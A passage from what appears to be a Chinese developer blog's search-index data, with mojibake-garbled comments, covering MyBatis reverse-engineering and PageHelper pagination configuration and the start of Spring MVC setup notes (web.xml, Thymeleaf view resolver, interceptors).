\u0026lt;groupId\u0026gt;log4j\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;log4j\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.17\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; \u0026lt;!-- æ§åˆ¶Mavenåœ¨æ„å»ºè¿‡ç¨‹ä¸­ç›¸å…³é…ç½® --\u0026gt; \u0026lt;build\u0026gt; \u0026lt;!-- æ„å»ºè¿‡ç¨‹ä¸­ç”¨åˆ°çš„æ’ä»¶ --\u0026gt; \u0026lt;plugins\u0026gt; \u0026lt;!-- å…·ä½“æ’ä»¶ï¼Œé€†å‘å·¥ç¨‹çš„æ“ä½œæ˜¯ä»¥æ„å»ºè¿‡ç¨‹ä¸­æ’ä»¶å½¢å¼å‡ºç°çš„ --\u0026gt; \u0026lt;plugin\u0026gt; \u0026lt;groupId\u0026gt;org.mybatis.generator\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;mybatis-generator-maven-plugin\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.3.0\u0026lt;/version\u0026gt; \u0026lt;!-- æ’ä»¶çš„ä¾èµ– --\u0026gt; \u0026lt;dependencies\u0026gt; \u0026lt;!-- é€†å‘å·¥ç¨‹çš„æ ¸å¿ƒä¾èµ– --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.mybatis.generator\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;mybatis-generator-core\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.3.2\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- æ•°æ®åº“è¿æ¥æ±  --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.mchange\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;c3p0\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;0.9.2\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- MySQLé©±åŠ¨ --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;mysql\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;mysql-connector-java\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;8.0.27\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; \u0026lt;/plugin\u0026gt; \u0026lt;/plugins\u0026gt; \u0026lt;/build\u0026gt; åˆ›å»ºé€†å‘å·¥ç¨‹çš„é…ç½®æ–‡ä»¶\næ–‡ä»¶åå¿…é¡»æ˜¯ï¼šgeneratorConfig.xml è¿™é‡Œæ˜¯macä¸‹çš„è·¯å¾„ï¼Œwindowséœ€è¦é¢å¤–ä¿®æ”¹ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE generatorConfiguration PUBLIC \u0026#34;-//mybatis.org//DTD MyBatis Generator Configuration 1.0//EN\u0026#34; \u0026#34;http://mybatis.org/dtd/mybatis-generator-config_1_0.dtd\u0026#34;\u0026gt; \u0026lt;generatorConfiguration\u0026gt; \u0026lt;!-- targetRuntime: æ‰§è¡Œç”Ÿæˆçš„é€†å‘å·¥ç¨‹çš„ç‰ˆæœ¬ MyBatis3Simple: ç”ŸæˆåŸºæœ¬çš„CRUDï¼ˆæ¸…æ–°ç®€æ´ç‰ˆï¼‰ MyBatis3: ç”Ÿæˆå¸¦æ¡ä»¶çš„CRUDï¼ˆå¥¢åå°Šäº«ç‰ˆï¼‰ --\u0026gt; \u0026lt;context id=\u0026#34;DB2Tables\u0026#34; targetRuntime=\u0026#34;MyBatis3\u0026#34;\u0026gt; \u0026lt;!-- æ•°æ®åº“çš„è¿æ¥ä¿¡æ¯ --\u0026gt; \u0026lt;jdbcConnection driverClass=\u0026#34;com.mysql.cj.jdbc.Driver\u0026#34; connectionURL=\u0026#34;jdbc:mysql://localhost:3306/mybatis?characterEncoding=utf8\u0026amp;amp;useSSL=false\u0026amp;amp;serverTimezone=UTC\u0026amp;amp;rewriteBatchedStatements=true\u0026#34; userId=\u0026#34;root\u0026#34; password=\u0026#34;root\u0026#34;\u0026gt; \u0026lt;/jdbcConnection\u0026gt; \u0026lt;!-- javaBeançš„ç”Ÿæˆç­–ç•¥--\u0026gt; \u0026lt;javaModelGenerator targetPackage=\u0026#34;com.reus.mybatis.pojo\u0026#34; targetProject=\u0026#34;./src/main/java\u0026#34;\u0026gt; \u0026lt;property name=\u0026#34;enableSubPackages\u0026#34; value=\u0026#34;true\u0026#34; /\u0026gt; \u0026lt;property name=\u0026#34;trimStrings\u0026#34; value=\u0026#34;true\u0026#34; /\u0026gt; \u0026lt;/javaModelGenerator\u0026gt; \u0026lt;!-- SQLæ˜ å°„æ–‡ä»¶çš„ç”Ÿæˆç­–ç•¥ --\u0026gt; \u0026lt;sqlMapGenerator targetPackage=\u0026#34;com.reus.mybatis.mapper\u0026#34; targetProject=\u0026#34;./src/main/resources\u0026#34;\u0026gt; \u0026lt;property name=\u0026#34;enableSubPackages\u0026#34; value=\u0026#34;true\u0026#34; /\u0026gt; \u0026lt;/sqlMapGenerator\u0026gt; \u0026lt;!-- Mapperæ¥å£çš„ç”Ÿæˆç­–ç•¥ --\u0026gt; \u0026lt;javaClientGenerator type=\u0026#34;XMLMAPPER\u0026#34; targetPackage=\u0026#34;com.reus.mybatis.mapper\u0026#34; targetProject=\u0026#34;./src/main/java\u0026#34;\u0026gt; \u0026lt;property name=\u0026#34;enableSubPackages\u0026#34; value=\u0026#34;true\u0026#34; /\u0026gt; \u0026lt;/javaClientGenerator\u0026gt; \u0026lt;!-- é€†å‘åˆ†æçš„è¡¨ --\u0026gt; \u0026lt;!-- tableNameè®¾ç½®ä¸º*å·ï¼Œå¯ä»¥å¯¹åº”æ‰€æœ‰è¡¨ï¼Œæ­¤æ—¶ä¸å†™domainObjectName --\u0026gt; \u0026lt;!-- domainObjectNameå±æ€§æŒ‡å®šç”Ÿæˆå‡ºæ¥çš„å®ä½“ç±»çš„ç±»å --\u0026gt; \u0026lt;table tableName=\u0026#34;t_emp\u0026#34; domainObjectName=\u0026#34;Emp\u0026#34;/\u0026gt; \u0026lt;table tableName=\u0026#34;t_dept\u0026#34; domainObjectName=\u0026#34;Dept\u0026#34;/\u0026gt; \u0026lt;/context\u0026gt; \u0026lt;/generatorConfiguration\u0026gt; è¿è¡Œç»“æœ\n10 é…ç½®åˆ†é¡µæ’ä»¶ pom.xmlæ·»åŠ ä¾èµ–\n1 2 3 4 5 6 \u0026lt;!-- https://mvnrepository.com/artifact/com.github.pagehelper/pagehelper --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.github.pagehelper\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;pagehelper\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;5.2.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; åœ¨MyBatisçš„æ ¸å¿ƒé…ç½®æ–‡ä»¶ï¼ˆmybatis-config.xmlï¼‰ä¸­é…ç½®æ’ä»¶\n1 2 3 4 \u0026lt;plugins\u0026gt; \u0026lt;!--è®¾ç½®åˆ†é¡µæ’ä»¶--\u0026gt; \u0026lt;plugin interceptor=\u0026#34;com.github.pagehelper.PageInterceptor\u0026#34;\u0026gt;\u0026lt;/plugin\u0026gt; \u0026lt;/plugins\u0026gt; ä½¿ç”¨\nåœ¨æŸ¥è¯¢åŠŸèƒ½ä¹‹å‰ä½¿ç”¨PageHelper.startPage(int pageNum, int pageSize)å¼€å¯åˆ†é¡µåŠŸèƒ½ pageNumï¼šå½“å‰é¡µçš„é¡µç  pageSizeï¼šæ¯é¡µæ˜¾ç¤ºçš„æ¡æ•° 1 2 3 4 5 6 EmpMapper mapper = sqlSession.getMapper(EmpMapper.class); //è®¿é—®ç¬¬ä¸€é¡µï¼Œæ¯é¡µå››æ¡æ•°æ® PageHelper.startPage(1,4); List\u0026lt;Emp\u0026gt; emps = mapper.selectByExample(null); emps.forEach(System.out::println); } åœ¨æŸ¥è¯¢è·å–listé›†åˆä¹‹åï¼Œä½¿ç”¨PageInfo\u0026lt;T\u0026gt; pageInfo = new PageInfo\u0026lt;\u0026gt;(List\u0026lt;T\u0026gt; list, intnavigatePages)è·å–åˆ†é¡µç›¸å…³æ•°æ®\nlistï¼šåˆ†é¡µä¹‹åçš„æ•°æ® navigatePagesï¼šå¯¼èˆªåˆ†é¡µçš„é¡µç æ•° 1 2 3 4 5 6 7 8 9 10 11 12 13 14 @Test public void testPageHelper() throws IOException { InputStream is = Resources.getResourceAsStream(\u0026#34;mybatis-config.xml\u0026#34;); SqlSessionFactoryBuilder sqlSessionFactoryBuilder = new SqlSessionFactoryBuilder(); SqlSessionFactory sqlSessionFactory = sqlSessionFactoryBuilder.build(is); SqlSession sqlSession = sqlSessionFactory.openSession(true); EmpMapper mapper = sqlSession.getMapper(EmpMapper.class); PageHelper.startPage(1, 4); List\u0026lt;Emp\u0026gt; emps = mapper.selectByExample(null); PageInfo\u0026lt;Emp\u0026gt; page = new PageInfo\u0026lt;\u0026gt;(emps,5); System.out.println(page); } ç»“æœï¼š\n1 2 3 4 5 PageInfo{ pageNum=1, pageSize=4, size=4, startRow=1, endRow=4, total=8, pages=2, list=Page{count=true, pageNum=1, pageSize=4, startRow=0, endRow=4, total=8, pages=2, reasonable=false, pageSizeZero=false} [Emp{eid=1, empName=\u0026#39;admin\u0026#39;, age=22, sex=\u0026#39;ç”·\u0026#39;, email=\u0026#39;456@qq.com\u0026#39;, did=3}, Emp{eid=2, empName=\u0026#39;admin2\u0026#39;, age=22, sex=\u0026#39;ç”·\u0026#39;, email=\u0026#39;456@qq.com\u0026#39;, did=3}, Emp{eid=3, empName=\u0026#39;ç‹äº”\u0026#39;, age=12, sex=\u0026#39;å¥³\u0026#39;, email=\u0026#39;123@qq.com\u0026#39;, did=3}, Emp{eid=4, empName=\u0026#39;èµµå…­\u0026#39;, age=32, sex=\u0026#39;ç”·\u0026#39;, email=\u0026#39;123@qq.com\u0026#39;, did=1}], prePage=0, nextPage=2, isFirstPage=true, isLastPage=false, hasPreviousPage=false, hasNextPage=true, navigatePages=5, navigateFirstPage=1, navigateLastPage=2, navigatepageNums=[1, 2]} å¸¸ç”¨æ•°æ® pageNumï¼šå½“å‰é¡µçš„é¡µç  pageSizeï¼šæ¯é¡µæ˜¾ç¤ºçš„æ¡æ•° sizeï¼šå½“å‰é¡µæ˜¾ç¤ºçš„çœŸå®æ¡æ•° totalï¼šæ€»è®°å½•æ•° pagesï¼šæ€»é¡µæ•° prePageï¼šä¸Šä¸€é¡µçš„é¡µç  nextPageï¼šä¸‹ä¸€é¡µçš„é¡µç  isFirstPage/isLastPageï¼šæ˜¯å¦ä¸ºç¬¬ä¸€é¡µ/æœ€åä¸€é¡µ hasPreviousPage/hasNextPageï¼šæ˜¯å¦å­˜åœ¨ä¸Šä¸€é¡µ/ä¸‹ä¸€é¡µ navigatePagesï¼šå¯¼èˆªåˆ†é¡µçš„é¡µç æ•° navigatepageNumsï¼šå¯¼èˆªåˆ†é¡µçš„é¡µç ï¼Œ[1,2,3,4,5] ","permalink":"http://www.reus09.top/posts/tech/mybatis/","summary":"MyBatis è¿™é‡Œæ•´ç†äº†MyBatisçš„å¸¸è§ç”¨æ³• Mybatis ä¸»è¦å¯¹æ•°æ®åº“çš„æ“ä½œæä¾›äº†ç»„ä»¶ 1 ç¯å¢ƒæ­å»º å¯¼å…¥ä¾èµ– 1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;!-- Mybatisæ ¸å¿ƒ --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.mybatis\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;mybatis\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.7\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt;","title":"Mybatis"},{"content":"Spring-mvc æœ¬ç¯‡ä¸»è¦å¯¹spring-mvcçš„çŸ¥è¯†ç‚¹è¿›è¡Œæ€»ç»“\nMVCçš„å·¥ä½œæµç¨‹ï¼š\nç”¨æˆ·é€šè¿‡è§†å›¾å±‚å‘é€è¯·æ±‚åˆ°æœåŠ¡å™¨ï¼Œåœ¨æœåŠ¡å™¨ä¸­è¯·æ±‚è¢«Controlleræ¥æ”¶ï¼ŒControllerè°ƒç”¨ç›¸åº”çš„Modelå±‚å¤„ç†è¯·æ±‚ï¼Œå¤„ç†å®Œæ¯•å°†ç»“æœè¿”å›åˆ°Controllerï¼ŒControllerå†æ ¹æ®è¯·æ±‚å¤„ç†çš„ç»“æœæ‰¾åˆ°ç›¸åº”çš„Viewè§†å›¾ï¼Œæ¸²æŸ“æ•°æ®åæœ€ç»ˆå“åº”ç»™æµè§ˆå™¨ SpringMVCå·¥ä½œæµç¨‹\næµè§ˆå™¨å‘é€è¯·æ±‚ï¼Œè‹¥è¯·æ±‚åœ°å€ç¬¦åˆå‰ç«¯æ§åˆ¶å™¨çš„url-patternï¼Œè¯¥è¯·æ±‚å°±ä¼šè¢«å‰ç«¯æ§åˆ¶å™¨DispatcherServletå¤„ç†ã€‚ å‰ç«¯æ§åˆ¶å™¨ä¼šè¯»å–SpringMVCçš„æ ¸å¿ƒé…ç½®æ–‡ä»¶ï¼Œé€šè¿‡æ‰«æç»„ä»¶æ‰¾åˆ°æ§åˆ¶å™¨ï¼Œå°†è¯·æ±‚åœ°å€å’Œæ§åˆ¶å™¨ä¸­@RequestMappingæ³¨è§£çš„valueå±æ€§å€¼è¿›è¡ŒåŒ¹é… è‹¥åŒ¹é…æˆåŠŸï¼Œè¯¥æ³¨è§£æ‰€æ ‡è¯†çš„æ§åˆ¶å™¨æ–¹æ³•å°±æ˜¯å¤„ç†è¯·æ±‚çš„æ–¹æ³•ã€‚å¤„ç†è¯·æ±‚çš„æ–¹æ³•éœ€è¦è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ç±»å‹çš„è§†å›¾åç§°ï¼Œè¯¥è§†å›¾åç§°ä¼šè¢«è§†å›¾è§£æå™¨è§£æï¼ŒåŠ ä¸Šå‰ç¼€å’Œåç¼€ç»„æˆè§†å›¾çš„è·¯å¾„ï¼Œé€šè¿‡Thymeleafå¯¹è§†å›¾è¿›è¡Œæ¸²æŸ“ï¼Œæœ€ç»ˆè½¬å‘åˆ°è§†å›¾æ‰€å¯¹åº”é¡µé¢ è½¬å‘å’Œé‡å®šå‘åŒºåˆ«\nforwardï¼ˆè½¬å‘ï¼‰ï¼š\næ˜¯æœåŠ¡å™¨è¯·æ±‚èµ„æº,æœåŠ¡å™¨ç›´æ¥è®¿é—®ç›®æ ‡åœ°å€çš„URL,æŠŠé‚£ä¸ªURLçš„å“åº”å†…å®¹è¯»å–è¿‡æ¥,ç„¶åæŠŠè¿™äº›å†…å®¹å†å‘ç»™æµè§ˆå™¨.æµè§ˆå™¨æ ¹æœ¬ä¸çŸ¥é“æœåŠ¡å™¨å‘é€çš„å†…å®¹ä»å“ªé‡Œæ¥çš„,å› ä¸ºè¿™ä¸ªè·³è½¬è¿‡ç¨‹å®åœ¨æœåŠ¡å™¨å®ç°çš„ï¼Œå¹¶ä¸æ˜¯åœ¨å®¢æˆ·ç«¯å®ç°çš„æ‰€ä»¥å®¢æˆ·ç«¯å¹¶ä¸çŸ¥é“è¿™ä¸ªè·³è½¬åŠ¨ä½œï¼Œæ‰€ä»¥å®ƒçš„åœ°å€æ è¿˜æ˜¯åŸæ¥çš„åœ°å€.\nredirectï¼ˆé‡å®šå‘ï¼‰ï¼š\næ˜¯æœåŠ¡ç«¯æ ¹æ®é€»è¾‘,å‘é€ä¸€ä¸ªçŠ¶æ€ç ,å‘Šè¯‰æµè§ˆå™¨é‡æ–°å»è¯·æ±‚é‚£ä¸ªåœ°å€.æ‰€ä»¥åœ°å€æ æ˜¾ç¤ºçš„æ˜¯æ–°çš„URL.\nè½¬å‘æ˜¯æœåŠ¡å™¨è¡Œä¸ºï¼Œé‡å®šå‘æ˜¯å®¢æˆ·ç«¯è¡Œä¸ºã€‚\n1 é…ç½®ç¯å¢ƒ ç›¸å…³ä¾èµ–\n1 2 3 4 5 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-webmvc\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;5.3.1\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; åœ¨web.xmlé‡Œé¢é…ç½®springMVCçš„ç»„ä»¶ï¼Œè¿˜æœ‰è¿‡æ»¤å™¨ï¼Œ å¯¹SpringMVCçš„é…ç½®æ–‡ä»¶:web.xml\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 \u0026lt;!--é…ç½®springMVCçš„ç¼–ç è¿‡æ»¤å™¨--\u0026gt; \u0026lt;filter\u0026gt; \u0026lt;filter-name\u0026gt;CharacterEncodingFilter\u0026lt;/filter-name\u0026gt; \u0026lt;filter-class\u0026gt;org.springframework.web.filter.CharacterEncodingFilter\u0026lt;/filter-class\u0026gt; \u0026lt;init-param\u0026gt; \u0026lt;param-name\u0026gt;encoding\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;UTF-8\u0026lt;/param-value\u0026gt; \u0026lt;/init-param\u0026gt; \u0026lt;init-param\u0026gt; \u0026lt;param-name\u0026gt;forceResponseEncoding\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;true\u0026lt;/param-value\u0026gt; \u0026lt;/init-param\u0026gt; \u0026lt;/filter\u0026gt; \u0026lt;filter-mapping\u0026gt; \u0026lt;filter-name\u0026gt;CharacterEncodingFilter\u0026lt;/filter-name\u0026gt; \u0026lt;url-pattern\u0026gt;/*\u0026lt;/url-pattern\u0026gt; \u0026lt;/filter-mapping\u0026gt; \u0026lt;!-- é…ç½®SpringMVCçš„å‰ç«¯æ§åˆ¶å™¨ï¼Œå¯¹æµè§ˆå™¨å‘é€çš„è¯·æ±‚ç»Ÿä¸€è¿›è¡Œå¤„ç† --\u0026gt; \u0026lt;servlet\u0026gt; \u0026lt;servlet-name\u0026gt;springMVC\u0026lt;/servlet-name\u0026gt; \u0026lt;servlet-class\u0026gt;org.springframework.web.servlet.DispatcherServlet\u0026lt;/servlet-class\u0026gt; \u0026lt;!-- é€šè¿‡åˆå§‹åŒ–å‚æ•°æŒ‡å®šSpringMVCé…ç½®æ–‡ä»¶çš„ä½ç½®å’Œåç§° --\u0026gt; \u0026lt;init-param\u0026gt; \u0026lt;!-- contextConfigLocationä¸ºå›ºå®šå€¼ --\u0026gt; \u0026lt;param-name\u0026gt;contextConfigLocation\u0026lt;/param-name\u0026gt; \u0026lt;!-- ä½¿ç”¨classpath:è¡¨ç¤ºä»ç±»è·¯å¾„æŸ¥æ‰¾é…ç½®æ–‡ä»¶ï¼Œä¾‹å¦‚mavenå·¥ç¨‹ä¸­çš„src/main/resources --\u0026gt; \u0026lt;param-value\u0026gt;classpath:springMVC.xml\u0026lt;/param-value\u0026gt; \u0026lt;/init-param\u0026gt; \u0026lt;!-- ä½œä¸ºæ¡†æ¶çš„æ ¸å¿ƒç»„ä»¶ï¼Œåœ¨å¯åŠ¨è¿‡ç¨‹ä¸­æœ‰å¤§é‡çš„åˆå§‹åŒ–æ“ä½œè¦åš è€Œè¿™äº›æ“ä½œæ”¾åœ¨ç¬¬ä¸€æ¬¡è¯·æ±‚æ—¶æ‰æ‰§è¡Œä¼šä¸¥é‡å½±å“è®¿é—®é€Ÿåº¦ å› æ­¤éœ€è¦é€šè¿‡æ­¤æ ‡ç­¾å°†å¯åŠ¨æ§åˆ¶DispatcherServletçš„åˆå§‹åŒ–æ—¶é—´æå‰åˆ°æœåŠ¡å™¨å¯åŠ¨æ—¶ --\u0026gt; \u0026lt;load-on-startup\u0026gt;1\u0026lt;/load-on-startup\u0026gt; \u0026lt;/servlet\u0026gt; \u0026lt;servlet-mapping\u0026gt; \u0026lt;servlet-name\u0026gt;springMVC\u0026lt;/servlet-name\u0026gt; \u0026lt;!-- è®¾ç½®springMVCçš„æ ¸å¿ƒæ§åˆ¶å™¨æ‰€èƒ½å¤„ç†çš„è¯·æ±‚çš„è¯·æ±‚è·¯å¾„ /æ‰€åŒ¹é…çš„è¯·æ±‚å¯ä»¥æ˜¯/loginæˆ–.htmlæˆ–.jsæˆ–.cssæ–¹å¼çš„è¯·æ±‚è·¯å¾„ ä½†æ˜¯/ä¸èƒ½åŒ¹é….jspè¯·æ±‚è·¯å¾„çš„è¯·æ±‚ --\u0026gt; \u0026lt;url-pattern\u0026gt;/\u0026lt;/url-pattern\u0026gt; \u0026lt;/servlet-mapping\u0026gt; æ³¨ï¼š\n\u0026lt;url-pattern\u0026gt;æ ‡ç­¾ä¸­ä½¿ç”¨/å’Œ/*çš„åŒºåˆ«ï¼š\n/æ‰€åŒ¹é…çš„è¯·æ±‚å¯ä»¥æ˜¯/loginæˆ–.htmlæˆ–.jsæˆ–.cssæ–¹å¼çš„è¯·æ±‚è·¯å¾„ï¼Œä½†æ˜¯/ä¸èƒ½åŒ¹é….jspè¯·æ±‚è·¯å¾„çš„è¯·æ±‚\nå› æ­¤å°±å¯ä»¥é¿å…åœ¨è®¿é—®jspé¡µé¢æ—¶ï¼Œè¯¥è¯·æ±‚è¢«DispatcherServletå¤„ç†ï¼Œä»è€Œæ‰¾ä¸åˆ°ç›¸åº”çš„é¡µé¢\n/*åˆ™èƒ½å¤ŸåŒ¹é…æ‰€æœ‰è¯·æ±‚ï¼Œä¾‹å¦‚åœ¨ä½¿ç”¨è¿‡æ»¤å™¨æ—¶ï¼Œè‹¥éœ€è¦å¯¹æ‰€æœ‰è¯·æ±‚è¿›è¡Œè¿‡æ»¤ï¼Œå°±éœ€è¦ä½¿ç”¨/*çš„å†™æ³•\nspring-mvc.xmlé…ç½®æ–‡ä»¶\nè¿™é‡Œæ˜¯ä»¥è§£æå™¨ä¸ºthymeleaf 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;beans xmlns=\u0026#34;http://www.springframework.org/schema/beans\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xmlns:context=\u0026#34;http://www.springframework.org/schema/context\u0026#34; xmlns:mvc=\u0026#34;http://www.springframework.org/schema/mvc\u0026#34; xsi:schemaLocation=\u0026#34;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd http://www.springframework.org/schema/mvc https://www.springframework.org/schema/mvc/spring-mvc.xsd\u0026#34;\u0026gt; \u0026lt;!-- æ‰«æç»„ä»¶--\u0026gt; \u0026lt;context:component-scan base-package=\u0026#34;com.reus.springmvc\u0026#34;\u0026gt;\u0026lt;/context:component-scan\u0026gt; \u0026lt;!-- é…ç½®Thymeleafè§†å›¾è§£æå™¨ --\u0026gt; \u0026lt;bean id=\u0026#34;viewResolver\u0026#34; class=\u0026#34;org.thymeleaf.spring5.view.ThymeleafViewResolver\u0026#34;\u0026gt; \u0026lt;property name=\u0026#34;order\u0026#34; value=\u0026#34;1\u0026#34;/\u0026gt; \u0026lt;property name=\u0026#34;characterEncoding\u0026#34; value=\u0026#34;UTF-8\u0026#34;/\u0026gt; \u0026lt;property name=\u0026#34;templateEngine\u0026#34;\u0026gt; \u0026lt;bean class=\u0026#34;org.thymeleaf.spring5.SpringTemplateEngine\u0026#34;\u0026gt; \u0026lt;property name=\u0026#34;templateResolver\u0026#34;\u0026gt; \u0026lt;bean class=\u0026#34;org.thymeleaf.spring5.templateresolver.SpringResourceTemplateResolver\u0026#34;\u0026gt; \u0026lt;!-- è§†å›¾å‰ç¼€ --\u0026gt; \u0026lt;property name=\u0026#34;prefix\u0026#34; value=\u0026#34;/WEB-INF/templates/\u0026#34;/\u0026gt; \u0026lt;!-- è§†å›¾åç¼€ --\u0026gt; \u0026lt;property name=\u0026#34;suffix\u0026#34; value=\u0026#34;.html\u0026#34;/\u0026gt; \u0026lt;property name=\u0026#34;templateMode\u0026#34; value=\u0026#34;HTML5\u0026#34;/\u0026gt; \u0026lt;property name=\u0026#34;characterEncoding\u0026#34; value=\u0026#34;UTF-8\u0026#34; /\u0026gt; \u0026lt;/bean\u0026gt; \u0026lt;/property\u0026gt; \u0026lt;/bean\u0026gt; \u0026lt;/property\u0026gt; \u0026lt;/bean\u0026gt; \u0026lt;!-- é…ç½®è§†å›¾æ§åˆ¶å™¨ --\u0026gt; \u0026lt;mvc:view-controller path=\u0026#34;/\u0026#34; view-name= \u0026#34;index\u0026#34; \u0026gt;\u0026lt;/mvc:view-controller\u0026gt; \u0026lt;!-- å¼€æ”¾å¯¹é™æ€èµ„æºçš„è®¿é—®--\u0026gt; \u0026lt;mvc:default-servlet-handler/\u0026gt; \u0026lt;!-- å¼€å¯ SpringMVC çš„ æ³¨è§£é©±åŠ¨ æ¯”å¦‚RequestMapping --\u0026gt; \u0026lt;mvc:annotation-driven/\u0026gt; \u0026lt;!-- é…ç½® æ–‡ä»¶ä¸Šä¼ è§£æå™¨ ï¼Œå°†ä¸Šä¼ çš„æ–‡ä»¶å°è£…ä¸ºMultipartFile--\u0026gt; \u0026lt;bean id= \u0026#34;multipartResolver\u0026#34; class=\u0026#34;org.springframework.web.multipart.commons.CommonsMultipartResolver\u0026#34;\u0026gt;\u0026lt;/bean\u0026gt; \u0026lt;!-- é…ç½®æ‹¦æˆªå™¨ --\u0026gt; \u0026lt;mvc:interceptors\u0026gt; \u0026lt;!-- \u0026lt;bean class=\u0026#34;com.reus.springmvc.interceptors.FirstInterceptor\u0026#34;\u0026gt;\u0026lt;/bean\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;mvc:interceptor\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;mvc:mapping path=\u0026#34;/*\u0026#34;/\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;mvc:exclude-mapping path=\u0026#34;/\u0026#34;/\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;ref bean=\u0026#34;firstInterceptor\u0026#34;\u0026gt;\u0026lt;/ref\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;/mvc:interceptor\u0026gt;--\u0026gt; \u0026lt;ref bean=\u0026#34;firstInterceptor\u0026#34;\u0026gt;\u0026lt;/ref\u0026gt; \u0026lt;ref bean=\u0026#34;secondInterceptor\u0026#34;\u0026gt;\u0026lt;/ref\u0026gt; \u0026lt;/mvc:interceptors\u0026gt; \u0026lt;!-- é…ç½® å¼‚å¸¸å¤„ç† --\u0026gt; \u0026lt;bean class=\u0026#34;org.springframework.web.servlet.handler.SimpleMappingExceptionResolver\u0026#34;\u0026gt; \u0026lt;property name=\u0026#34;exceptionMappings\u0026#34;\u0026gt; \u0026lt;props\u0026gt; \u0026lt;prop key=\u0026#34;java.lang.ArithmeticException\u0026#34;\u0026gt;error\u0026lt;/prop\u0026gt; \u0026lt;/props\u0026gt; \u0026lt;/property\u0026gt; \u0026lt;!-- è®¾ç½®å°†å¼‚å¸¸ä¿¡æ¯å…±äº«åœ¨è¯·æ±‚åŸŸä¸­--\u0026gt; \u0026lt;property name=\u0026#34;exceptionAttribute\u0026#34; value=\u0026#34;ex\u0026#34;\u0026gt;\u0026lt;/property\u0026gt; \u0026lt;/bean\u0026gt; \u0026lt;/beans\u0026gt; 2 SpringMVCä¸­å¸¸ç”¨çš„æ ‡ç­¾ 2.1 @RequestingMapping RequestingMapping\n@RequestMappingæ³¨è§£çš„ä½œç”¨å°±æ˜¯å°†è¯·æ±‚å’Œå¤„ç†è¯·æ±‚çš„æ§åˆ¶å™¨æ–¹æ³•å…³è”èµ·æ¥ï¼Œå»ºç«‹æ˜ å°„å…³ç³»ã€‚\n@RequestMappingæ³¨è§£çš„valueå±æ€§æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ç±»å‹çš„æ•°ç»„ï¼Œè¡¨ç¤ºè¯¥è¯·æ±‚æ˜ å°„èƒ½å¤ŸåŒ¹é…å¤šä¸ªè¯·æ±‚åœ°å€æ‰€å¯¹åº”çš„è¯·æ±‚ è¿™ä¸ªè¿›å…¥å¯ä»¥ç”¨åœ¨SpringMVC.xmlé‡Œé¢ç”¨é…ç½®çš„æ–¹å¼ä»£æ›¿ã€‚\n1 \u0026lt;mvc:view-controller path=\u0026#34;/\u0026#34; view-name= \u0026#34;index\u0026#34; \u0026gt;\u0026lt;/mvc:view-controller\u0026gt; ä½†æ˜¯å¼€å¯è¿™ä¸ªä¼šå¯¼è‡´å…¶ä»–æ ‡æ³¨çš„è¯·æ±‚æ˜ å°„å¤±æ•ˆï¼Œå› æ­¤éœ€è¦å¼€å¯mvcæ³¨è§£é©±åŠ¨ 